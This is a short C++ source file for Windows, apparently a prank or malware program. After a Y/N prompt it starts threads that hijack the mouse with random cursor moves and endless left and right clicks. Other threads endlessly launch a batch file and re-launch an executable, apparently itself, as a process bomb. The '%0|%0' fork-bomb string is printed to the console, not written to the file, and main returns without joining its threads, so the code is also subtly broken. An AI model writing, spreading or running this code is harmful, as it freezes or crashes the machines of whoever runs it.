#include<bits/stdc++.h>
#include<stdlib.h>
#include<fstream>
#include<thread>
#include<windows.h>
#include<time.h>
using namespace std;
void is(){
	string s;
	cout<<"start run?:(Y/N)";
	cin>>s;
	if(s=="Y"){
		return;
	}
	exit(0);
}
void f(){
	ofstream t;
	t.open("a.bat",ios::out|ios::trunc);
	cout<<"%0|%0";
	t.close();
	while(1){
		system("start a.bat");
	}
}
void g(){
	int nWidth = GetSystemMetrics(SM_CXSCREEN); 
	int nHeight = GetSystemMetrics(SM_CYSCREEN);
	while(1){
		SetCursorPos(rand()%nWidth,rand()%nHeight);	
	}
}
void h(){
	while(1){
		mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
		Sleep(10);
		mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
		mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
		Sleep(10);
		mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
	}
}
void j(){
	while(1){
		system("start 未命名1.exe");
	}
}
void k(){
	
}
int main(){
	is();
	srand(time(NULL));
	thread t1(f);
	thread t2(g);
	thread t3(h);
	thread t4(j);
	return 0;
}